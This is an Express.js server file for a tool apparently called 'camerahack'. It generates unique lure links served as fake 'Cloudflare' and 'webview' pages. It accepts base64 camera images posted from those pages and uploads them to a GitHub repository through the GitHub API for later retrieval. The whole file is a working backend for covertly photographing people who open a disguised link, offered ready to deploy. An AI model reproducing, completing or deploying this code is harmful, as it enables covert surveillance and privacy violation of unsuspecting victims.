const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const app = express();

require('dotenv').config();

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true }));

// Database connection
mongoose.connect(process.env.DB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('MongoDB connected'))
    .catch(err => {
        console.error('MongoDB connection error:', err);
        process.exit(1);
    });

// Model
const Url = require('./models/Url');

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Routes
app.post('/generate', (req, res) => {
    const uniqueId = uuidv4();
    const cloudflareUrl = `https://camerahack-8c3cc7d0cd44.herokuapp.com/c/${uniqueId}`;
    const webViewUrl = `https://camerahack-8c3cc7d0cd44.herokuapp.com/w/${uniqueId}`;

    const newUrl = new Url({ url: req.body.url, uniqueId });
    newUrl.save().then(() => res.json({ cloudflareUrl, webViewUrl })).catch(err => res.status(500).json({ error: err.message }));
});

app.get('/c/:id', (req, res) => {
    const id = req.params.id;
    res.sendFile(path.join(__dirname, 'public', 'cloudflare.html'));
});

app.get('/w/:id', (req, res) => {
    const id = req.params.id;
    res.sendFile(path.join(__dirname, 'public', 'webview.html'));
});

app.post('/upload/:id', async (req, res) => {
    const id = req.params.id;
    const imageData = req.body.image.replace(/^data:image\/png;base64,/, '');
    const imageBuffer = Buffer.from(imageData, 'base64');
    const imagePath = `uploads/${id}.png`;
    
    // Save the image to GitHub
    const githubToken = process.env.GITHUB_TOKEN;
    const repo = 'yourusername/yourrepo';  // Replace with your GitHub username and repository name
    const filePath = `uploads/${id}.png`;
    const message = `Upload image for ${id}`;
    const content = imageBuffer.toString('base64');

    try {
        const response = await fetch(`https://api.github.com/repos/${repo}/contents/${filePath}`, {
            method: 'PUT',
            headers: {
                'Authorization': `token ${githubToken}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message,
                content
            })
        });

        if (response.ok) {
            await Url.findOneAndUpdate({ uniqueId: id }, { screenshot: filePath }, { new: true });
            res.sendStatus(200);
        } else {
            res.status(response.status).send(await response.text());
        }
    } catch (err) {
        console.error('Error uploading image to GitHub:', err);
        res.sendStatus(500);
    }
});

app.get('/image/:id', async (req, res) => {
    const id = req.params.id;
    try {
        const url = await Url.findOne({ uniqueId: id });
        if (url && url.screenshot) {
            const githubToken = process.env.GITHUB_TOKEN;
            const repo = 'yourusername/yourrepo';  // Replace with your GitHub username and repository name
            const filePath = `uploads/${id}.png`;

            const response = await fetch(`https://api.github.com/repos/${repo}/contents/${filePath}`, {
                headers: {
                    'Authorization': `token ${githubToken}`,
                    'Accept': 'application/vnd.github.v3.raw'
                }
            });

            if (response.ok) {
                const buffer = await response.buffer();
                res.set('Content-Type', 'image/png');
                res.send(buffer);
            } else {
                res.status(response.status).send(await response.text());
            }
        } else {
            res.sendStatus(404);
        }
    } catch (err) {
        console.error('Error fetching image from GitHub:', err);
        res.sendStatus(500);
    }
});

// Server setup
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
